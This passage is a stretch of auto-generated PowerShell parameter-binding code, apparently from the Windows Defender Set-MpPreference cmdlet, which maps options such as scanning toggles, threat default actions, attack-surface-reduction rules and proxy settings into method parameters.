$true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableEmailScanning')) {\r\n          [object]$__cmdletization_value = ${DisableEmailScanning}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableRemovableDriveScanning')) {\r\n          [object]$__cmdletization_value = ${DisableRemovableDriveScanning}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableRestorePoint')) {\r\n          [object]$__cmdletization_value = ${DisableRestorePoint}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableScanningMappedNetworkDrivesForFullScan')) {\r\n          [object]$__cmdletization_value = ${DisableScanningMappedNetworkDrivesForFullScan}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableScanningNetworkFiles')) {\r\n          [object]$__c"
"mdletization_value = ${DisableScanningNetworkFiles}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ApplyDisableNetworkScanningToIOAV')) {\r\n          [object]$__cmdletization_value = ${ApplyDisableNetworkScanningToIOAV}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ApplyDisableNetworkScanningToIOAV'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ApplyDisableNetworkScanningToIOAV'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('UILockdown')) {\r\n          [object]$__cmdletization_value = ${UILockdown}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Ids')) {\r\n          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Ids}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Actions')) {\r\n          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Actions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('UnknownThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${UnknownThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('LowThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${LowThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ModerateThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${ModerateThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('HighThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${HighThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SevereThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${SevereThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Force')) {\r\n          [object]$__cmdletization_value = ${Force}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableBlockAtFirstSeen')) {\r\n          [object]$__cmdletization_value = ${DisableBlockAtFirstSeen}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('PUAProtection')) {\r\n          [object]$__cmdletization_value = ${PUAProtection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PUAProtectionType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PUAProtectionType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('CloudBlockLevel')) {\r\n          [object]$__cmdletization_value = ${CloudBlockLevel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.CloudBlockLevelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.CloudBlockLevelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('CloudExtendedTimeout')) {\r\n          [object]$__cmdletization_value = ${CloudExtendedTimeout}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableNetworkProtection')) {\r\n          [object]$__cmdletization_value = ${EnableNetworkProtection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cm"
"dletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableControlledFolderAccess')) {\r\n          [object]$__cmdletization_value = ${EnableControlledFolderAccess}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ControlledFolderAccessType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ControlledFolderAccessType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionOnlyExclusions')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionOnlyExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessAllowedApplications')) {\r\n          [object]$__cmdletization_value = ${ControlledFolderAccessAllowedApplications}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessProtectedFolders')) {\r\n          [object]$__cmdletization_value = ${ControlledFolderAccessProtectedFolders}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Ids')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Ids}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Actions')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Actions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableLowCpuPriority')) {\r\n          [object]$__cmdletization_value = ${EnableLowCpuPriority}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableFileHashComputation')) {\r\n          [object]$__cmdletization_value = ${EnableFileHashComputation}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableFullScanOnBatteryPower')) {\r\n          [object]$__cmdletization_value = ${EnableFullScanOnBatteryPower}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ProxyPacUrl')) {\r\n          [object]$__cmdletization_value = ${ProxyPacUrl}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ProxyServer')) {\r\n          [object]$__cmdletization_value = ${ProxyServer}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ProxyBypass')) {\r\n          [object]$__cmdletization_value = ${ProxyBypass}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ForceUseProxyOnly')) {\r\n          [object]$__cmdletization_value = ${ForceUseProxyOnly}\r\n          $__cmdletization_methodParameter = 